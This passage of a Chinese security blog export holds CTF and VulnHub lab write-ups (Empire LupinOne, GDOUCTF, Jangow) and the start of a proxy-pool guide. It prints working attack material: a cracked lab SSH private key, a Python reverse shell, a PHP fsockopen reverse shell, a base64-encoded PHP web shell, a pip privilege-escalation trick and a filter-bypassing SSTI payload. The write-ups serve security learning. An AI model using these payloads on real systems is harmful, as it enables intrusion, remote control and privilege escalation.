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</span><br></pre></td></tr></table></figure>\n\n<p>base类的编码，测试发现是base58编码，解码之后得到秘钥</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp</span><br><span class=\"line\">PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk</span><br><span class=\"line\">9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9</span><br><span class=\"line\">H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6</span><br><span class=\"line\">xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7</span><br><span class=\"line\">J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu</span><br><span class=\"line\">/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0</span><br><span class=\"line\">ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I</span><br><span class=\"line\">he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf</span><br><span class=\"line\">XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA</span><br><span class=\"line\">hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb</span><br><span class=\"line\">4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq</span><br><span class=\"line\">mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp</span><br><span class=\"line\">MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA</span><br><span class=\"line\">2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb</span><br><span class=\"line\">QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE</span><br><span class=\"line\">vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ</span><br><span class=\"line\">0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft</span><br><span class=\"line\">rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB</span><br><span class=\"line\">QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy</span><br><span class=\"line\">x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG</span><br><span class=\"line\">nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5</span><br><span class=\"line\">VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO</span><br><span class=\"line\">cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh</span><br><span class=\"line\">nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm</span><br><span class=\"line\">8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH</span><br><span class=\"line\">zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw</span><br><span class=\"line\">n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl</span><br><span class=\"line\">AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93</span><br><span class=\"line\">oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI</span><br><span class=\"line\">63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV</span><br><span class=\"line\">y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+</span><br><span class=\"line\">t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2</span><br><span class=\"line\">Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU</span><br><span class=\"line\">yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI</span><br><span class=\"line\">8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU</span><br><span class=\"line\">mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r</span><br><span class=\"line\">VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ</span><br><span class=\"line\">E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ</span><br><span class=\"line\">BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2</span><br><span class=\"line\">yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+</span><br><span class=\"line\">wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P</span><br><span class=\"line\">5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8</span><br><span class=\"line\">vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ</span><br><span class=\"line\">Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB</span><br><span class=\"line\">1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB</span><br><span class=\"line\">ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC</span><br><span class=\"line\">iUJ66WmRUN9EoVlkeCzQJwivI=</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>将其保存为<code>sshkey</code>，然后在刚刚的提示里面发现了<code>fasttrack</code>，所以大概率是使用<code>fasttrack</code>来进行爆破</p>\n<p>先使用<code>ssh2john</code>来获取ssh秘钥的哈希值</p>\n<blockquote>\n<p>ssh2john sshkey &gt; hash</p>\n</blockquote>\n<p>然后使用<code>john</code>来破解hash值</p>\n<blockquote>\n<p>sudo john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt hash</p>\n</blockquote>\n<p><img src=\"/images/EmpireLupinOne/image-20230612121513029.png\" alt=\"image-20230612121513029\"></p>\n<blockquote>\n<p>密码：P@55w0rd!</p>\n</blockquote>\n<p>账户在提示中已经给出，<code>icex64</code>，然后使用<code>sudo ssh -i sshkey icex64@10.0.2.11</code></p>\n<p><em>注：这里要给sshkey这个文件足够的权限，否则会导致失败</em></p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612121731596.png\" alt=\"image-20230612121731596\"></p>\n<p>获取到第一个flag</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612121801735.png\" alt=\"image-20230612121801735\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><p>使用<code>sudo -l</code>发现存在一个python文件不需要密码可以进入<code>arsene</code>用户</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612121911183.png\" alt=\"image-20230612121911183\"></p>\n<p>查看一下该文件的内容</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612121947909.png\" alt=\"image-20230612121947909\"></p>\n<p>导入了这个库，我们可以查看一下这个库的相关信息</p>\n<blockquote>\n<p>find &#x2F; -name “webbrowser.py”</p>\n<p>cd &#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;</p>\n</blockquote>\n<p>查看一下该文件的权限</p>\n<blockquote>\n<p>ls -al | grep webbrowser.py</p>\n</blockquote>\n<p><img src=\"/images/EmpireLupinOne/image-20230612122707674.png\" alt=\"image-20230612122707674\"></p>\n<p>很好！使用其进行反弹shell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pty,socket;s=socket.socket();s.connect((<span class=\"string\">&quot;10.0.2.15&quot;</span>,<span class=\"number\">9001</span>));[os.dup2(s.fileno(),f)<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>)];pty.spawn(<span class=\"string\">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/EmpireLupinOne/image-20230612123206017.png\" alt=\"image-20230612123206017\"></p>\n<p>在本地监听端口，然后运行</p>\n<blockquote>\n<p>sudo -u arsene python3.9 &#x2F;home&#x2F;arsene&#x2F;heist.py</p>\n</blockquote>\n<p><img src=\"/images/EmpireLupinOne/image-20230612123443383.png\" alt=\"image-20230612123443383\"></p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612123502167.png\" alt=\"image-20230612123502167\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>这里可以使用pip进行提权</p>\n<blockquote>\n<p>TF&#x3D;$(mktemp -d)<br>echo “import os; os.execl(‘&#x2F;bin&#x2F;sh’, ‘sh’, ‘-c’, ‘sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)’)” &gt; $TF&#x2F;setup.py<br>sudo pip install $TF</p>\n</blockquote>\n<p><img src=\"/images/EmpireLupinOne/image-20230612123625762.png\" alt=\"image-20230612123625762\"></p>\n<p>成功提权，获取到第二个flag</p>\n<p><img src=\"/images/EmpireLupinOne/image-20230612123649716.png\" alt=\"image-20230612123649716\"></p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"GDOUCTF WP","url":"/2023/07/17/GDOUCTF-WP/","content":"<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"ez-ze\"><a href=\"#ez-ze\" class=\"headerlink\" title=\"ez_ze\"></a>ez_ze</h2><p>这题考察的是SSTI注入的绕过手法，也是学习到了一些新的SSTI绕过手法</p>\n<p>参考链接：<a href=\"https://blog.csdn.net/weixin_52635170/article/details/129856818\">SSTI模板注入-<br>中括号、args、下划线、单双引号、os、request、花括号、数字被过滤绕过</a></p>\n<p>最后得到的payload如下：</p>\n<pre><code>&#123;% set three=dict(ccc=a)|join|count %&#125;&#123;% set eight=dict(cccccccc=a)|join|count %&#125;&#123;% set pop=dict(pop=a)|join %&#125;&#123;% set xhx=(lipsum|string|list)|attr(pop)(three*eight) %&#125;&#123;% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %&#125;&#123;% set get=dict(get=a)|join %&#125;&#123;% set shell=dict(o=a,s=b)|join %&#125;&#123;% set aaa=dict(po=a,pen=b)|join %&#125;&#123;% set builtins=(xhx,xhx,dict(builtins=a)|join,xhx,xhx)|join %&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;% print ((lipsum|attr(globals))|attr(get)(shell)|attr(aaa)('cat /flag')|attr(read)()) %&#125;\n</code></pre>\n<p><img src=\"/images/GDOUCTF-WP/image-20240717201415816.png\" alt=\"image-20240717201415816\"></p>\n<h2 id=\"hate-eat-snake\"><a href=\"#hate-eat-snake\" class=\"headerlink\" title=\"hate eat snake\"></a>hate eat snake</h2><p>这题在snack.js中把除以一千直接去掉</p>\n<p><img src=\"/images/GDOUCTF-WP/image-20240717201426992.png\" alt=\"image-20240717201426992\"></p>\n<p>可以成功得到flag</p>\n<h2 id=\"受不了一点\"><a href=\"#受不了一点\" class=\"headerlink\" title=\"受不了一点\"></a>受不了一点</h2><p>给出了源码，绕过即可得到flag</p>\n<pre><code>&lt;?php\nerror_reporting(0);\nheader(&quot;Content-type:text/html;charset=utf-8&quot;);\nif (isset($_POST[&#39;gdou&#39;]) &amp;&amp; isset($_POST[&#39;ctf&#39;])) &#123;\n    $b = $_POST[&#39;ctf&#39;];\n    $a = $_POST[&#39;gdou&#39;];\n    if ($_POST[&#39;gdou&#39;] != $_POST[&#39;ctf&#39;] &amp;&amp; md5($a) === md5($b)) &#123;\n        if (isset($_COOKIE[&#39;cookie&#39;])) &#123;\n            if ($_COOKIE[&#39;cookie&#39;] == &#39;j0k3r&#39;) &#123;\n                if (isset($_GET[&#39;aaa&#39;]) &amp;&amp; isset($_GET[&#39;bbb&#39;])) &#123;\n                    $aaa = $_GET[&#39;aaa&#39;];\n                    $bbb = $_GET[&#39;bbb&#39;];\n                    if ($aaa == 114514 &amp;&amp; $bbb == 114514 &amp;&amp; $aaa != $bbb) &#123;\n                        $give = &#39;cancanwordflag&#39;;\n                        $get = &#39;hacker!&#39;;\n                        if (!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])) &#123;\n                            die($give);\n                        &#125;\n                        if ($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;) &#123;\n                            die($get);\n                        &#125;\n                        foreach ($_POST as $key =&gt; $value) &#123;\n                            $$key = $value;\n                        &#125;\n                        foreach ($_GET as $key =&gt; $value) &#123;\n                            $$key = $$value;\n                        &#125;\n                        echo $f1ag;\n                    &#125; else &#123;\n                        echo &quot;洗洗睡吧&quot;;\n                    &#125;\n                &#125; else &#123;\n                    echo &quot;行不行啊细狗&quot;;\n                &#125;\n            &#125;\n        &#125; else &#123;\n            echo &#39;菜菜&#39;;\n        &#125;\n    &#125; else &#123;\n        echo &quot;就这?&quot;;\n    &#125;\n&#125; else &#123;\n    echo &quot;别来沾边&quot;;\n&#125; ?&gt; \n</code></pre>\n<p>payload如下：</p>\n<pre><code>GET:?aaa=114514a&amp;bbb=114514bPOST:gdou[]=1&amp;ctf[]=2&amp;flag[]=flagCookie:cookie=j0k3r\n</code></pre>\n<p><img src=\"/images/GDOUCTF-WP/image-20240717201445856.png\" alt=\"image-20240717201445856\"></p>\n<h2 id=\"EZ-WEB\"><a href=\"#EZ-WEB\" class=\"headerlink\" title=\"EZ WEB\"></a>EZ WEB</h2><p><img src=\"/images/GDOUCTF-WP/image-20240717201455545.png\" alt=\"image-20240717201455545\"></p>\n<p><img src=\"/images/GDOUCTF-WP/image-20240717201506193.png\" alt=\"image-20240717201506193\"></p>\n<p>然后使用PUT方式访问，得到flag</p>\n<p><img src=\"/images/GDOUCTF-WP/image-20240717201511106.png\" alt=\"image-20240717201511106\"></p>\n<h1 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h1><h2 id=\"Absolute-Baby-Encrytpion\"><a href=\"#Absolute-Baby-Encrytpion\" class=\"headerlink\" title=\"Absolute_Baby_Encrytpion\"></a>Absolute_Baby_Encrytpion</h2><p><img src=\"/images/GDOUCTF-WP/image-20240717201516723.png\" alt=\"image-20240717201516723\"></p>\n<p>js简单的替换加密，替换回来就可以了</p>\n<p><img src=\"/images/GDOUCTF-WP/image-20240717201523947.png\" alt=\"image-20240717201523947\"></p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"Jangow","url":"/2023/06/07/Jangow/","content":"<p>靶机下载地址：<a href=\"https://www.vulnhub.com/entry/jangow-101,754/\">https://www.vulnhub.com/entry/jangow-101,754/</a></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>首先使用<code>sudo arp-scan -I eth0 -l</code>获取主机的IP地址</p>\n<p><img src=\"/images/Jangow/image-20230607132232018.png\"></p>\n<p>然后使用<code>nmap -sC -sV -p- 10.0.2.6 -o result.txt</code>获取端口信息</p>\n<p>在此期间我们可以访问其网站看看有没有开启http服务</p>\n<p><img src=\"/images/Jangow/image-20230607132709898.png\"></p>\n<p>扫描后台文件，使用<code>dirsearch -u &quot;http://10.0.2.6/site/&quot;</code>，并没有发现什么有用的信息</p>\n<p><img src=\"/images/Jangow/image-20230607132926107.png\"></p>\n<p>点击<code>buscar</code>发现有一个空白页面，还有一个参数可以进行传递</p>\n<p><img src=\"/images/Jangow/image-20230607133041784.png\"></p>\n<p>经过payload的fuzz，发现存在命令执行</p>\n<p><img src=\"/images/Jangow/image-20230607133837197.png\"></p>\n<p>nmap扫出来发现开放的端口只有21和80，然后尝试匿名FTP登录，发现失败了</p>\n<p><img src=\"/images/Jangow/image-20230607133952786.png\"></p>\n<p><img src=\"/images/Jangow/image-20230607134046855.png\"></p>\n<h2 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h2><p>我们可以使用命令执行来通过PHP反弹shell</p>\n<blockquote>\n<p>php -r ‘$sock&#x3D;fsockopen(“10.0.2.15”,7777);exec(“&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>\n</blockquote>\n<p><img src=\"/images/Jangow/image-20230607134321551.png\"></p>\n<p>然后发现一直转，但是就是没有获取到shell，这里可能是对外不出网的，使用<code>curl</code>或者<code>wegt</code>验证一下，可以先使用whereis查看一下是否有wget</p>\n<p><img src=\"/images/Jangow/image-20230607134510174.png\"></p>\n<p><img src=\"/images/Jangow/image-20230607134550603.png\"></p>\n<p>证明不出网，这里就要使用木马了，然后使用哥斯拉的不出网反弹shell功能获取shell。</p>\n<p>先写入一句话木马</p>\n<blockquote>\n<p>echo ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzhdKTsgPz4nID4gc2hlbGwucGhw | base64 -d | sh</p>\n</blockquote>\n<p><img src=\"/images/Jangow/image-20230607134751504.png\"></p>\n<p>使用哥斯拉进行连接</p>\n<p><img src=\"/images/Jangow/image-20230607134918941.png\"></p>\n<p>然后点击start，在本地使用<code>rlwrap -cAr nc 127.0.0.1 4444</code>获取shell</p>\n<p><img src=\"/images/Jangow/image-20230607135029528.png\"></p>\n<p>然后使用<code>bash -i</code>获取更高级的shell，但是这个shell还是不够使用，使用whereis发现存在python的环境，所有我们可以使用下面的命令获取交互式shell</p>\n<p><img src=\"/images/Jangow/image-20230607135859922.png\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><p>在html目录下发现<code>.backup</code>文件，然后使用cat命令查看发现是一个数据库的账号密码</p>\n<p><img src=\"/images/Jangow/image-20230607140023235.png\"></p>\n<p>因为我们之前是发现了有ftp服务的，所以我们尝试使用这个账号密码是否可以进行登录</p>\n<p><img src=\"/images/Jangow/image-20230607140159950.png\"></p>\n<p>无法进入root目录，所以权限还是不高的，还是要进行其他的操作</p>\n<p><img src=\"/images/Jangow/image-20230607140253112.png\"></p>\n<p>使用<code>netstat -anlt</code>发现有22端口开放，应该是只对内部网络开放的（因为之前端口扫描并没有获取到端口信息）</p>\n<p><img src=\"/images/Jangow/image-20230607140430275.png\"></p>\n<p>使用之前的账号密码也是可以进行登录的</p>\n<p><img src=\"/images/Jangow/image-20230607140531824.png\"></p>\n<p>在该目录中获取第一个flag</p>\n<p><img src=\"/images/Jangow/image-20230607140638576.png\"></p>\n<p>但是权限不高…………使用<code>uname -a</code>查看系统信息</p>\n<p><img src=\"/images/Jangow/image-20230607140652421.png\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>经过查找资料，发现这个版本是存在一个CVE漏洞的（CVE-2021-4034），通过查看发现确实可以利用</p>\n<p><img src=\"/images/Jangow/image-20230607140830903.png\"></p>\n<p>然后我们使用ftp上传exp，使用put命令</p>\n<p><img src=\"/images/Jangow/image-20230607140948083.png\"></p>\n<p>使用<code>gcc cve-2021-4034-poc.c -o exp</code>获取可执行文件，运行之后可以获取到root权限</p>\n<p><img src=\"/images/Jangow/image-20230607141129344.png\"></p>\n<p><img src=\"/images/Jangow/image-20230607141156912.png\"></p>\n<p>还可以使用脏牛进行提权</p>\n<p><img src=\"/images/Jangow/image-20230607141338711.png\"></p>\n<p><img src=\"/images/Jangow/image-20230607141420574.png\"></p>\n<p>也是可以获取root权限的</p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"IP代理池的搭建和使用","url":"/2023/07/30/IP%E4%BB%A3%E7%90%86%E6%B1%A0%E7%9A%84%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8/","content":"<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>这里的代理池项目需要使用到Redis，所以我们要先安装Redis数据库，安装方法：<a href=\"https://cuiqingcai.com/5219.html\">https://cuiqingcai.com/5219.html</a></p>\n<h3 id=\"Redis安装\"><a href=\"#Redis安装\" class=\"headerlink\" title=\"Redis安装\"></a>Redis安装</h3><h4 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h4><p>下载地址：<a href=\"https://github.com/microsoftarchive/redis/releases\">https://github.com/microsoftarchive/redis/releases</a></p>\n<p>然后无脑安装即可。然后在服务里面可以发现Redis服务已经开启了，这样就说明Redis已经安装成功了，并且启动了。</p>\n<h4 id=\"Linux（ubuntu为例）\"><a href=\"#Linux（ubuntu为例）\" class=\"headerlink\" title=\"Linux（ubuntu为例）\"></a>Linux（ubuntu为例）</h4><h3 id=\"python安装、安装需要的库\"><a href=\"#python安装、安装需要的库\" class=\"headerlink\" title=\"python安装、安装需要的库\"></a>python安装、安装需要的库</h3><p>python安装省略</p>\n<p>python安装库的命令：<code>pip3 install -r https://raw.githubusercontent.com/Python3WebSpider/ProxyPool/master/requirements.txt</code></p>\n<h2 id=\"代理池的目标\"><a 